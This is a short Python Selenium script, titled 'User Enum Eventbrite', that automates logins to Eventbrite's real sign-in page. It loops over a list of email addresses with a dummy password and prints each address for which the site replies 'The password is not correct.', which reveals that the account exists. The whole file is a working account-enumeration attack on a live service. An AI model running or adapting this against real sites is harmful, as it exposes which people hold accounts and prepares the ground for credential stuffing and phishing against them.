# User Enum Eventbrite
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from time import sleep
import extract_html_diff


print("The usernames present in Eventbrite are:")

# Place all the Email IDs to test in the for loop as shown below.
# You can remove all the Email IDs below
for i in ["spider1@gmail.com", "superman@gmail.com", "michael@gmail.com", "wuasdbaabba@gmail.com"]:

    # Using edge browser
    driver = webdriver.Edge(executable_path='msedgedriver')

    # Using Firefox browser
    # driver = webdriver.FirefoxProfile()
    # driver = webdriver.Firefox(driver)

    user = i
    passw = 'wjnjj!@3221j' # sample password to enter to the input box

    driver.get("https://www.eventbrite.com/signin/?referrer=%2F")
    p1 = driver.page_source
    sleep(3)
    elem=driver.find_element_by_xpath("//input[@type='email']")
    elem.send_keys(user)
    elem = driver.find_element_by_xpath("//input[@type='password']")
    elem.send_keys(passw)
    elem.send_keys(Keys.RETURN)
    sleep(2)
    p2 = driver.page_source
    p3 = extract_html_diff.as_string(p2, p1)
    #print(p3)
    if "The password is not correct." in p3:
        print(i)
    sleep(2)
    driver.close()
